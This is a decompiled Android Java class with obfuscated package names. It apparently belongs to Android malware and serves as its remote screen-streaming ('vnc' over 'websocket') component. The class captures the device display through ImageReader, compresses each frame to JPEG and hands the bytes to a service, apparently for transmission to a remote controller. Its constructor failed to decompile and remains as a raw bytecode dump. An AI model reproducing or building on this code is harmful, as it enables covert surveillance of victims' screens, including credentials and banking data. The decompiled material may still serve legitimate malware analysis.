package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy;

import android.annotation.TargetApi;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.Bitmap.Config;
import android.media.Image;
import android.media.Image.Plane;
import android.media.ImageReader;
import android.media.ImageReader.OnImageAvailableListener;
import android.view.Surface;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import wocwvy.czyxoxmbauu.slsa.C0034b;

@TargetApi(21)
/* renamed from: wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.a */
public class C0087a implements OnImageAvailableListener {

    /* renamed from: a */
    C0034b f541a = new C0034b();

    /* renamed from: b */
    private final int f542b;

    /* renamed from: c */
    private final int f543c;

    /* renamed from: d */
    private final ImageReader f544d;

    /* renamed from: e */
    private final jkeggfql f545e;

    /* renamed from: f */
    private Bitmap f546f = null;

    /* JADX WARNING: Removed duplicated region for block: B:12:0x0050 A[LOOP:0: B:10:0x004a->B:12:0x0050, LOOP_END] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    C0087a(wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.jkeggfql r6) {
        /*
            r5 = this;
            r5.<init>()
            r0 = 0
            r5.f546f = r0
            wocwvy.czyxoxmbauu.slsa.b r0 = new wocwvy.czyxoxmbauu.slsa.b
            r0.<init>()
            r5.f541a = r0
            r5.f545e = r6
            android.view.WindowManager r0 = r6.mo429a()
            android.view.Display r0 = r0.getDefaultDisplay()
            android.graphics.Point r1 = new android.graphics.Point
            r1.<init>()
            r0.getSize(r1)
            int r0 = r1.x
            int r2 = r1.y
            r2 = 800(0x320, float:1.121E-42)
            r3 = 2
            if (r0 <= 0) goto L_0x0031
            if (r0 > r2) goto L_0x0031
        L_0x002a:
            int r0 = r1.x
            int r0 = r0 / r3
            int r1 = r1.y
            int r1 = r1 / r3
            goto L_0x004a
        L_0x0031:
            r4 = 1600(0x640, float:2.242E-42)
            if (r0 <= r2) goto L_0x0040
            if (r0 > r4) goto L_0x0040
            int r0 = r1.x
            int r0 = r0 / 3
            int r1 = r1.y
            int r1 = r1 / 3
            goto L_0x004a
        L_0x0040:
            if (r0 <= r4) goto L_0x002a
            int r0 = r1.x
            int r0 = r0 / 4
            int r1 = r1.y
            int r1 = r1 / 4
        L_0x004a:
            int r2 = r0 * r1
            r4 = 1048576(0x100000, float:1.469368E-39)
            if (r2 <= r4) goto L_0x0055
            int r0 = r0 >> 1
            int r1 = r1 >> 1
            goto L_0x004a
        L_0x0055:
            r5.f542b = r0
            r5.f543c = r1
            r2 = 1
            android.media.ImageReader r0 = android.media.ImageReader.newInstance(r0, r1, r2, r3)
            r5.f544d = r0
            android.media.ImageReader r0 = r5.f544d
            android.os.Handler r6 = r6.mo431b()
            r0.setOnImageAvailableListener(r5, r6)
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.C0087a.<init>(wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.jkeggfql):void");
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public Surface mo423a() {
        return this.f544d.getSurface();
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: b */
    public int mo424b() {
        return this.f542b;
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: c */
    public int mo425c() {
        return this.f543c;
    }

    public void onImageAvailable(ImageReader imageReader) {
        Image acquireLatestImage = this.f544d.acquireLatestImage();
        if (acquireLatestImage != null) {
            Plane[] planes = acquireLatestImage.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = this.f542b + ((planes[0].getRowStride() - (this.f542b * pixelStride)) / pixelStride);
            if (!(this.f546f != null && this.f546f.getWidth() == rowStride && this.f546f.getHeight() == this.f543c)) {
                if (this.f546f != null) {
                    this.f546f.recycle();
                }
                this.f546f = Bitmap.createBitmap(rowStride, this.f543c, Config.ARGB_8888);
            }
            this.f546f.copyPixelsFromBuffer(buffer);
            if (acquireLatestImage != null) {
                acquireLatestImage.close();
            }
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            Bitmap.createBitmap(this.f546f, 0, 0, this.f542b, this.f543c).compress(CompressFormat.JPEG, 100, byteArrayOutputStream);
            byte[] byteArray = byteArrayOutputStream.toByteArray();
            if (this.f541a.mo234e(this.f545e, "vnc").equals("stop") || this.f541a.mo234e(this.f545e, "websocket").equals("")) {
                this.f545e.stopForeground(true);
                this.f545e.stopService(this.f545e.f548a);
            } else {
                this.f545e.mo430a(byteArray);
                this.f545e.startService(new Intent(this.f545e, nvsdtnxkzjgw.class));
            }
        }
    }
}
